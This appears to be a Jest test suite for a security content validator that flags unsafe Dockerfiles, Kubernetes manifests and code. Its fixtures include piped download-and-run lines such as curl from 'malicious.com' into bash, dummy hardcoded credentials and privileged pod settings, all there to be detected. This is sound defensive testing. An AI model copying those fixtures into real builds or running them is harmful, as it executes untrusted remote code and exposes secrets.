/**
 * Content Validator Tests
 * Comprehensive tests for security content validation
 */

import { describe, it, expect } from '@jest/globals';
import { ContentValidator } from '../../../../src/infrastructure/ai/content-validator.js';

describe('ContentValidator', () => {
  let validator: ContentValidator;

  beforeEach(() => {
    validator = new ContentValidator();
  });

  describe('Docker content validation', () => {
    it('should pass validation for secure Dockerfile', () => {
      const secureDockerfile = `FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001
USER nodejs
EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\
  CMD curl -f http://localhost:3000/health || exit 1
CMD ["npm", "start"]`;

      const result = validator.validateContent(secureDockerfile, 'dockerfile');

      expect(result.isValid).toBe(true);
      expect(result.issues).toHaveLength(0);
      expect(result.summary).toBe('No security issues detected');
    });

    it('should detect high-severity Docker security issues', () => {
      const unsafeDockerfile = `FROM node:latest
USER root
RUN curl http://malicious.com/script.sh | bash
RUN wget https://example.com/install.sh | sh
COPY --privileged . .`;

      const result = validator.validateContent(unsafeDockerfile, 'dockerfile');

      expect(result.isValid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
      
      const highSeverityIssues = result.issues.filter(i => i.severity === 'high');
      expect(highSeverityIssues.length).toBeGreaterThan(0);
      
      // Check for specific security issues
      expect(result.issues.some(i => i.message.includes('curl') && i.message.includes('shell'))).toBe(true);
      expect(result.issues.some(i => i.message.includes('wget') && i.message.includes('shell'))).toBe(true);
    });

    it('should detect medium-severity Docker issues', () => {
      const dockerfileWithWarnings = `FROM node:latest
USER root
ADD http://example.com/file.tar.gz /app/`;

      const result = validator.validateContent(dockerfileWithWarnings, 'dockerfile');

      expect(result.isValid).toBe(true); // No high-severity issues
      expect(result.issues.length).toBeGreaterThan(0);
      
      const mediumSeverityIssues = result.issues.filter(i => i.severity === 'medium');
      expect(mediumSeverityIssues.length).toBeGreaterThan(0);
      
      // Check for latest tag warning
      expect(result.issues.some(i => i.message.includes('latest tag'))).toBe(true);
      // Check for ADD with HTTP warning
      expect(result.issues.some(i => i.message.includes('ADD with HTTP'))).toBe(true);
    });

    it('should detect credential exposure in Dockerfiles', () => {
      const dockerfileWithSecrets = `FROM node:18
ENV API_KEY=abc123def456
ENV PASSWORD=mysecretpassword
ENV DATABASE_URL=postgresql://user:pass@localhost/db
COPY . .`;

      const result = validator.validateContent(dockerfileWithSecrets, 'dockerfile');

      expect(result.isValid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
      
      const credentialIssues = result.issues.filter(i => 
        i.message.includes('credential') || i.message.includes('database')
      );
      expect(credentialIssues.length).toBeGreaterThan(0);
    });
  });

  describe('Kubernetes content validation', () => {
    it('should pass validation for secure Kubernetes manifest', () => {
      const secureK8sManifest = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
      containers:
      - name: app
        image: myapp:v1.2.3
        ports:
        - containerPort: 8080
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL`;

      const result = validator.validateContent(secureK8sManifest, 'k8s');

      expect(result.isValid).toBe(true);
      expect(result.issues).toHaveLength(0);
    });

    it('should detect high-severity Kubernetes security issues', () => {
      const unsafeK8sManifest = `apiVersion: v1
kind: Pod
metadata:
  name: unsafe-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
      runAsUser: 0`;

      const result = validator.validateContent(unsafeK8sManifest, 'k8s');

      expect(result.isValid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
      
      const highSeverityIssues = result.issues.filter(i => i.severity === 'high');
      expect(highSeverityIssues.length).toBeGreaterThan(0);
      
      // Check for specific Kubernetes security issues
      expect(result.issues.some(i => i.message.includes('hostNetwork'))).toBe(true);
      expect(result.issues.some(i => i.message.includes('hostPID'))).toBe(true);
      expect(result.issues.some(i => i.message.includes('privileged'))).toBe(true);
    });

    it('should detect medium-severity Kubernetes issues', () => {
      const k8sWithWarnings = `apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: myapp:latest
        securityContext:
          runAsUser: 0
          readOnlyRootFilesystem: false`;

      const result = validator.validateContent(k8sWithWarnings, 'k8s');

      expect(result.isValid).toBe(true); // No high-severity issues
      expect(result.issues.length).toBeGreaterThan(0);
      
      const mediumSeverityIssues = result.issues.filter(i => i.severity === 'medium');
      expect(mediumSeverityIssues.length).toBeGreaterThan(0);
    });
  });

  describe('General content validation', () => {
    it('should detect credential exposure in general content', () => {
      const contentWithCredentials = `
        export API_KEY="sk-1234567890abcdef"
        const password = "supersecret123"
        private_key = "-----BEGIN PRIVATE KEY-----\\nMIIEvQ..."
        connection_string = "Server=localhost;Database=test;User=admin;Password=secret;"
      `;

      const result = validator.validateContent(contentWithCredentials, 'general');

      expect(result.isValid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
      
      const credentialIssues = result.issues.filter(i => i.severity === 'high');
      expect(credentialIssues.length).toBeGreaterThan(0);
    });

    it('should detect insecure network practices', () => {
      const insecureContent = `
        curl --insecure http://example.com/api
        wget --no-ssl-check http://insecure.com/data
        fetch('http://api.example.com/data')
      `;

      const result = validator.validateContent(insecureContent, 'general');

      expect(result.issues.length).toBeGreaterThan(0);
      
      // Should detect insecure flags and HTTP usage
      expect(result.issues.some(i => i.message.includes('insecure'))).toBe(true);
      expect(result.issues.some(i => i.message.includes('HTTP URLs'))).toBe(true);
    });

    it('should pass validation for secure content', () => {
      const secureContent = `
        const apiEndpoint = 'https://api.example.com/v1';
        const config = {
          ssl: true,
          secure: true
        };
        fetch(apiEndpoint, { headers: { 'Authorization': 'Bearer ${process.env.API_TOKEN}' } })
      `;

      const result = validator.validateContent(secureContent, 'general');

      expect(result.isValid).toBe(true);
      expect(result.issues).toHaveLength(0);
    });
  });

  describe('Validation utilities', () => {
    it('should provide validation summary', () => {
      const dockerfileWithIssues = `FROM node:latest
USER root
ENV SECRET=password123`;

      const summary = validator.getValidationSummary(dockerfileWithIssues, 'dockerfile');

      expect(summary).toContain('security issues');
      expect(summary).toContain('dockerfile');
    });

    it('should filter issues by severity', () => {
      const allIssues = [
        { severity: 'high' as const, message: 'High issue', category: 'docker' },
        { severity: 'medium' as const, message: 'Medium issue', category: 'docker' },
        { severity: 'low' as const, message: 'Low issue', category: 'docker' }
      ];

      const highOnly = validator.filterBySeverity(allIssues, 'high');
      const mediumAndUp = validator.filterBySeverity(allIssues, 'medium');
      const allFiltered = validator.filterBySeverity(allIssues, 'low');

      expect(highOnly).toHaveLength(1);
      expect(mediumAndUp).toHaveLength(2);
      expect(allFiltered).toHaveLength(3);
    });

    it('should group issues by category', () => {
      const mixedIssues = [
        { severity: 'high' as const, message: 'Docker issue', category: 'docker' },
        { severity: 'medium' as const, message: 'K8s issue', category: 'k8s' },
        { severity: 'low' as const, message: 'General issue', category: 'general' },
        { severity: 'high' as const, message: 'Another docker issue', category: 'docker' }
      ];

      const grouped = validator.groupByCategory(mixedIssues);

      expect(grouped.docker).toHaveLength(2);
      expect(grouped.k8s).toHaveLength(1);
      expect(grouped.general).toHaveLength(1);
    });

    it('should validate multiple content pieces', () => {
      const contents = [
        { content: 'FROM node:latest', name: 'Dockerfile' },
        { content: 'privileged: true', name: 'k8s-manifest.yaml' }
      ];

      const result = validator.validateMultiple(contents, 'general');

      expect(result.issues.length).toBeGreaterThan(0);
      expect(result.issues.some(i => i.message.includes('Dockerfile:'))).toBe(true);
      expect(result.issues.some(i => i.message.includes('k8s-manifest.yaml:'))).toBe(true);
    });
  });
});